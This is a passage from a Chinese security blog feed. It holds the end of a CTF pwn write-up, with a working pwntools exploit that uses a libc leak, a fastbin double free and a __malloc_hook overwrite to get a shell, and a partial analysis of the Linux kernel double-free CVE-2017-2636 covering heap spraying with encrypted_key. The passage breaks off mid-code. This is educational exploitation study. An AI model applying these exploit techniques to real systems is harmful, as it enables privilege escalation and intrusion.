class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_sentence</span><span class="params">(s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.send(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_word</span><span class="params">(word)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">    p.sendline(str(len(word)))</span><br><span class="line">    p.send(word)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'s'</span> * <span class="number">0x85</span> + <span class="string">' m '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'m'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 1. leak libc base</span></span><br><span class="line">    unsortedbin_addr = leak_libc()</span><br><span class="line">    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena</span><br><span class="line">    libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'unsortedbin addr: '</span> + hex(unsortedbin_addr))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">    index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">    search_word(<span class="string">'d'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. fastbin attack to malloc_hook nearby chunk</span></span><br><span class="line">    fake_chunk_addr = main_arena_addr - <span class="number">0x33</span></span><br><span class="line">    fake_chunk = p64(fake_chunk_addr).ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(fake_chunk)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看完了以后“好像是这么回事”，自己解题“不会”。</p><ol><li>通过 ‘\x00’ 等特殊字符绕过验证使其 double free、use after free。</li><li>通过 unsort bin addr 找到 libc。</li><li>libc 里有现成的骚东西，把 malloc hook 的改成那个即可。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; class=&quot;headerlink&quot; title=&quot;程序分析&quot;&gt;&lt;/a&gt;程序分析&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-2636 Linux kernel dbf 分析</title>
    <link href="https://github.com/Cracke-S-J/2020/03/20/cve-2017-2636/"/>
    <id>https://github.com/Cracke-S-J/2020/03/20/cve-2017-2636/</id>
    <published>2020-03-20T02:15:57.000Z</published>
    <updated>2020-04-01T07:08:52.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>不谈背景只看漏洞都是耍流氓。</p><blockquote><p>“这是 CVE-2017-2636 的声明，该漏洞即 N_HLDC (drivers/tty/n_hdlc.c) linux 内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList 的安全公告提到。“该驱动提供 HDLC 串行线路规程，这是很多 linux 发行版中的内核模块——只要是内核设置中有 CONFIG_N_HDLC=m 的 linux 发行版。要利用这个漏洞不需要 Microgate 或者 SyncLink 硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。”</p></blockquote><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在 <code>drivers/tty/n_hdlc.c</code> 中存在竞争条件，同一个对象可以两次被加入到一个将被 free 的链表中，然后导致 double free。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>kfree 在 free 一个指针后，该指针所指内容会被设为上一个被 free 的地址。也就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kfree(p1);</span><br><span class="line">kfree(p2);</span><br><span class="line">kfree(p2);</span><br><span class="line">kfree(p3);</span><br></pre></td></tr></table></figure><p>那么会得到 <code>*(unsigned long *)p2 = p2; *(unsigned long *)p3 = p2;</code>，两个可被重新申请的块的首地址相同，这时再 kmalloc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kmalloc(sz, ...);</span><br><span class="line">kmalloc(sz, ...);</span><br></pre></td></tr></table></figure><p>可以得到指向同一空间的两个对象，当对象的大小可以被控制，就一个可以随意写入，一个可以包含指针。</p><p>下面分析 <code>kmalloc-8192, 内核版本3.10.x, cve-2017-2636</code>。</p><h2 id="encrypted-key"><a href="#encrypted-key" class="headerlink" title="encrypted key"></a>encrypted key</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *format;          <span class="comment">/* datablob: format */</span></span><br><span class="line">    <span class="keyword">char</span> *master_desc;     <span class="comment">/* datablob: master key name */</span></span><br><span class="line">    <span class="keyword">char</span> *datalen;         <span class="comment">/* datablob: decrypted key length */</span></span><br><span class="line">    u8 *iv;                <span class="comment">/* datablob: iv */</span></span><br><span class="line">    u8 *encrypted_data;    <span class="comment">/* datablob: encrypted data */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> datablob_len;           <span class="comment">/* length of datablob */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> decrypted_datalen;      <span class="comment">/* decrypted data length */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> payload_datalen;        <span class="comment">/* payload data length */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> encrypted_key_format;   <span class="comment">/* encrypted key format */</span></span><br><span class="line">    u8 *decrypted_data;    <span class="comment">/* decrypted data */</span></span><br><span class="line">    u8 payload_data[<span class="number">0</span>];    <span class="comment">/* payload data + datablob + hmac */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体的大小是 0x48，下面看它是如何被申请的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct encrypted_key_payload *<span class="title">encrypted_key_alloc</span><span class="params">(struct key *key,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="keyword">char</span> *format,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="keyword">char</span> *master_desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="keyword">char</span> *datalen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    ret = kstrtol(datalen, <span class="number">10</span>, &amp;dlen);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span> || dlen &lt; MIN_DATA_SIZE || dlen &gt; MAX_DATA_SIZE)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">    format_len = (!format) ? <span class="built_in">strlen</span>(key_format_default) : <span class="built_in">strlen</span>(format);</span><br><span class="line">    decrypted_datalen = dlen;</span><br><span class="line">    payload_datalen = decrypted_datalen;</span><br><span class="line">    <span class="keyword">if</span> (format &amp;&amp; !<span class="built_in">strcmp</span>(format, key_format_ecryptfs)) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    encrypted_datalen = roundup(decrypted_datalen, blksize);</span><br><span class="line"></span><br><span class="line">    datablob_len = format_len + <span class="number">1</span> + <span class="built_in">strlen</span>(master_desc) + <span class="number">1</span></span><br><span class="line">        + <span class="built_in">strlen</span>(datalen) + <span class="number">1</span> + ivsize + <span class="number">1</span> + encrypted_datalen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 这个函数也比较重要 */</span></span><br><span class="line">    ret = key_payload_reserve(key, payload_datalen + datablob_len</span><br><span class="line">                  + HASH_SIZE + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 申请指定大小的对象 */</span></span><br><span class="line">    epayload = kzalloc(<span class="keyword">sizeof</span>(*epayload) + payload_datalen +</span><br><span class="line">               datablob_len + HASH_SIZE + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!epayload)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    epayload-&gt;payload_datalen = payload_datalen;</span><br><span class="line">    epayload-&gt;decrypted_datalen = decrypted_datalen;</span><br><span class="line">    epayload-&gt;datablob_len = datablob_len;</span><br><span class="line">    <span class="keyword">return</span> epayload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数利用方法是 <code>&quot;new default user:user_key_desc payload_len&quot;</code>。函数参数中的 format 指向 default，master_desc 指向 user:user_key_desc, datalen 指向 payload_len，payload 最大为 4096，也就是 encrypted_key_payload 对象最大的时候会取kmalloc-8192，最小的时候由于加上了 HASH_SIZE + 1, 所以最小 0x48 + 32 + 1 = 0x69。因此这个对象可以落在 kmalloc-128 - kmalloc-8192 的区域。</p><h2 id="使用-encrypted-key-的系统限制和策略"><a href="#使用-encrypted-key-的系统限制和策略" class="headerlink" title="使用 encrypted_key 的系统限制和策略"></a>使用 encrypted_key 的系统限制和策略</h2><p>在 <code>/proc/sys/kernel/keys/</code> 中，保存着当前系统普通用户能申请的 key 数以及总大小，限制了这个对象的喷的总数。在 encrypted_update 函数中，也调用了 encrypted_key_alloc 函数，然后会释放之前申请的空间，可以利用这个函数来进行交替堆喷。</p><p>encrypted_update 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">encrypted_update</span><span class="params">(struct key *key, struct key_preparsed_payload *prep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">epayload</span> = <span class="title">key</span>-&gt;<span class="title">payload</span>.<span class="title">data</span>[0];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">new_epayload</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">char</span> *new_master_desc = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (test_bit(KEY_FLAG_NEGATIVE, &amp;key-&gt;flags))</span><br><span class="line">        <span class="keyword">return</span> -ENOKEY;</span><br><span class="line">    <span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    buf = kmalloc(datalen + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!buf)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    buf[datalen] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, prep-&gt;data, datalen);</span><br><span class="line">    ret = datablob_parse(buf, &amp;format, &amp;new_master_desc, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* update的时候, 如果master_desc不匹配, 返回EINVAL */</span></span><br><span class="line">    ret = valid_master_desc(new_master_desc, epayload-&gt;master_desc);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 校验完成, 申请新的payload */</span></span><br><span class="line">    new_epayload = encrypted_key_alloc(key, epayload-&gt;format,</span><br><span class="line">                       new_master_desc, epayload-&gt;datalen);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(new_epayload)) &#123;</span><br><span class="line">        ret = PTR_ERR(new_epayload);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __ekey_init(new_epayload, epayload-&gt;format, new_master_desc,</span><br><span class="line">            epayload-&gt;datalen);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_epayload-&gt;iv, epayload-&gt;iv, ivsize);</span><br><span class="line">    <span class="built_in">memcpy</span>(new_epayload-&gt;payload_data, epayload-&gt;payload_data,</span><br><span class="line">           epayload-&gt;payload_datalen);</span><br><span class="line"></span><br><span class="line">    rcu_assign_keypointer(key, new_epayload);</span><br><span class="line">    <span class="comment">/* 释放之前的payload */</span></span><br><span class="line">    call_rcu(&amp;epayload-&gt;rcu, encrypted_rcu_free);</span><br><span class="line">out:</span><br><span class="line">    kfree(buf);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用-encrypted-key-payload-来任意地址读"><a href="#用-encrypted-key-payload-来任意地址读" class="headerlink" title="用 encrypted_key_payload 来任意地址读"></a>用 encrypted_key_payload 来任意地址读</h2><p>在 double free 环境中，另外一个对象覆盖了 encrypted_key_payload 的数据。在 encrypted_read 函数中，会读取 <code>payload-&gt;format payload-&gt;master_desc payload-&gt;datalen payload-&gt;iv</code> 指向的数据。</p><p>下面是 encrypted_read 和 datablob_format：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">encrypted_read</span><span class="params">(<span class="keyword">const</span> struct key *key, <span class="keyword">char</span> __user *buffer,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">size_t</span> buflen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">epayload</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">mkey</span>;</span></span><br><span class="line">    <span class="keyword">const</span> u8 *master_key;</span><br><span class="line">    <span class="keyword">size_t</span> master_keylen;</span><br><span class="line">    <span class="keyword">char</span> derived_key[HASH_SIZE];</span><br><span class="line">    <span class="keyword">char</span> *ascii_buf;</span><br><span class="line">    <span class="keyword">size_t</span> asciiblob_len;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    epayload = rcu_dereference_key(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* returns the hex encoded iv, encrypted-data, and hmac as ascii */</span></span><br><span class="line">    asciiblob_len = epayload-&gt;datablob_len + ivsize + <span class="number">1</span></span><br><span class="line">        + roundup(epayload-&gt;decrypted_datalen, blksize)</span><br><span class="line">        + (HASH_SIZE * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!buffer || buflen &lt; asciiblob_len)</span><br><span class="line">        <span class="keyword">return</span> asciiblob_len;</span><br><span class="line"></span><br><span class="line">    mkey = request_master_key(epayload, &amp;master_key, &amp;master_keylen);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(mkey))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(mkey);</span><br><span class="line"></span><br><span class="line">    ret = get_derived_key(derived_key, ENC_KEY, master_key, master_keylen);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    ret = derived_key_encrypt(epayload, derived_key, <span class="keyword">sizeof</span> derived_key);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    ret = datablob_hmac_append(epayload, master_key, master_keylen);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读取所需数据到buf中 */</span></span><br><span class="line">    ascii_buf = datablob_format(epayload, asciiblob_len);</span><br><span class="line">    <span class="keyword">if</span> (!ascii_buf) &#123;</span><br><span class="line">        ret = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    up_read(&amp;mkey-&gt;sem);</span><br><span class="line">    key_put(mkey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buffer, ascii_buf, asciiblob_len) != <span class="number">0</span>)</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    kfree(ascii_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> asciiblob_len;</span><br><span class="line">out:</span><br><span class="line">    up_read(&amp;mkey-&gt;sem);</span><br><span class="line">    key_put(mkey);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">datablob_format</span><span class="params">(struct encrypted_key_payload *epayload,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">size_t</span> asciiblob_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ascii_buf, *bufp;</span><br><span class="line">    u8 *iv = epayload-&gt;iv;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    ascii_buf = kmalloc(asciiblob_len + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!ascii_buf)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    ascii_buf[asciiblob_len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy datablob master_desc and datalen strings */</span></span><br><span class="line">    len = <span class="built_in">sprintf</span>(ascii_buf, <span class="string">"%s %s %s "</span>, epayload-&gt;format,</span><br><span class="line">              epayload-&gt;master_desc, epayload-&gt;datalen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* convert the hex encoded iv, encrypted-data and HMAC to ascii */</span></span><br><span class="line">    bufp = &amp;ascii_buf[len];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (asciiblob_len - len) / <span class="number">2</span>; i++)</span><br><span class="line">        bufp = hex_byte_pack(bufp, iv[i]);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ascii_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用-encrypted-key-提权"><a href="#用-encrypted-key-提权" class="headerlink" title="用 encrypted key 提权"></a>用 encrypted key 提权</h2><p>可以用这个清零实现提权（吗？）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">encrypted_destroy</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">epayload</span> = <span class="title">key</span>-&gt;<span class="title">payload</span>.<span class="title">data</span>[0];</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!epayload)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(epayload-&gt;decrypted_data, <span class="number">0</span>, epayload-&gt;decrypted_datalen);</span><br><span class="line">    kfree(key-&gt;payload.data[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tty-struct-write-buf"><a href="#tty-struct-write-buf" class="headerlink" title="tty_struct.write_buf"></a>tty_struct.write_buf</h2><p>write_buf 成员在 do_tty_write 函数中申请, 默认长度为2048。</p><p>从代码里面可以看出，write_buf 的大小也是可控的，大小[2048, 65536]。搜索代码，得到 TTY_NO_WRITE_SPLIT 标志在 n_hdlc.c 中有路径会将其置位。而 write_buf 指向的空间数据可以通过 write 系统调用来实现。</p><p>PS: 用 open 打开 tty 时需要加上 O_NONBLOCK 标志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 